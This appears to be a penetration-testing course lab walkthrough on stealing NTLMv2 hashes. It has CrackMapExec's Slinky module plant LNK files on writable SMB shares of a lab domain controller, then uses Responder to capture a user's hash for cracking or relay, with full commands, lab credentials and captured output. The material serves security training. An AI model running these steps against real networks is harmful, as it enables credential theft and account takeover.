# Stealing Hashes

One of the most common techniques for compromising new accounts is the theft of password hashes. There are different methods of achieving this, but a widespread one is forcing a computer or user to initiate an authentication process with a fake shared folder we control.

When starting this authentication process, the user or computer does it with an NTLMv2 hash. This hash could be cracked using a tool such as Hashcat or forwarded to another computer to impersonate the user without knowing their credentials.

To steal hashes using shared folders, we can create a shortcut and configure it so that the icon that appears in the shortcut points to our fake shared folder. Once the user enters the shared folder, it will try to look for the icon's location, forcing the authentication against our shared folder.

To learn more about harvesting NTLMv2 hashes, we can read the blog [Farming for Red Teams: Harvesting NetNTLM from MDsec](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/) which shows not only the use of shortcuts but also other types of files that serve the same purpose.

***

## Slinky Module

`Slinky` is a module created by [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) and by far one of the most exciting modules on CME. The principle is straightforward. The module creates Windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions. When someone visits the share, we will get their NTLMv2 hash using Responder because the icon attribute contains a UNC path to our server.

The module has two mandatory options, `SERVER` and `NAME`, and one optional `CLEANUP`.

### **Slinky Module Options**

```shell-session
$ crackmapexec smb -M slinky --options

[*] slinky module options:

        SERVER        IP of the SMB server
        NAME          LNK file nametest
        CLEANUP       Cleanup (choices: True or False)
```

`SERVER` corresponds to the IP of the SMB server we control and where we want the UNC path to point. The `NAME` option assigns a name to the shortcut file, and `CLEANUP` is to delete the shortcut once we finish.

***

## Connecting using Chisel

For this exercise, we will simulate local access and use Chisel and Proxychains to connect to the internal network. Chisel is already running as a server in our target machine, and we need to connect as a client and then use proxychains to enumerate the internal network. To connect using Chisel let's use the following command:

### **Connecting to the Target Machine Chisel Server**

```shell-session
$ sudo chisel client 10.129.204.133:8080 socks

2022/11/22 07:15:52 client: Connecting to ws://10.129.204.133:8080
2022/11/22 07:15:52 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 07:15:53 client: Connected (Latency 125.541725ms)
```

***

## Stealing NTLMv2 Hashes

First, let us find a share where the user `grace` has `WRITE` privileges using the option `--shares`:

### **Finding Shares with WRITE Privileges**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [+] Enumerated shares
SMB         172.16.1.10     445    DC01             Share           Permissions     Remark
SMB         172.16.1.10     445    DC01             -----           -----------     ------
SMB         172.16.1.10     445    DC01             ADMIN$                          Remote Admin
SMB         172.16.1.10     445    DC01             C$                              Default share
SMB         172.16.1.10     445    DC01             D$                              Default share
SMB         172.16.1.10     445    DC01             flag            READ            
SMB         172.16.1.10     445    DC01             HR              READ,WRITE      
SMB         172.16.1.10     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.1.10     445    DC01             IT                              
SMB         172.16.1.10     445    DC01             IT-Tools        READ,WRITE      
SMB         172.16.1.10     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.1.10     445    DC01             SYSVOL          READ            Logon server share
```

As we see, `grace` can write to the `HR` and `IT-Tools` shares. Therefore we can use the module `Slinky` to write an LNK file to each share. We will use the option `SERVER=10.10.14.33`, the IP address corresponding to our attack host's `tun0` network, and the option `NAME=important`, which is the file name we are assigning to the LNK file.

### **Using Slinky**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: HR
SLINKY      172.16.1.10     445    DC01             [+] Created LNK file on the HR share
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
SLINKY      172.16.1.10     445    DC01             [+] Created LNK file on the IT-Tools share
```

{% embed url="https://academy.hackthebox.com/storage/modules/84/slinky-lnk-file.jpg" %}

{% hint style="info" %}
**Note:** CrackMapExec is generally considered opsec safe because everything is either run in memory, enumerated over the network using WinAPI calls, or executed using built-in Windows tools/features. We will get a prompt when a module doesn't meet these requirements. The Slinky module is an example of a not opsec safe module. We will get a prompt before proceeding.
{% endhint %}

Once the LNK file is created, we need to run `Responder` and wait for someone to browse to the share. To learn more about how to use Responder, we can check the section [Attacking SMB](https://academy.hackthebox.com/module/116/section/1167) in the [Attacking Common Services](https://academy.hackthebox.com/module/details/116/) module.

### **Starting Responder**

```shell-session
$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script, hit CTRL-C

<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.204.133
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
[SMB] NTLMv2-SSP Hash     : julio::INLANEFREIGHT:6ab02caa0926e456:433DB600379844344ED4D3A073CAF995:[SNIP]
```

{% hint style="info" %}
**Note:** The SMB option should be `On` in the `Responder.conf` file to capture the hash.
{% endhint %}

We got our NTLMv2 hash, and we need to crack it to exploit the account, or we can do an NTLM Relay. To crack it, we can use Hashcat mode `5600` just as we did with ASREPRoast and Kerberoasting. Let's focus on NTLM Relay.

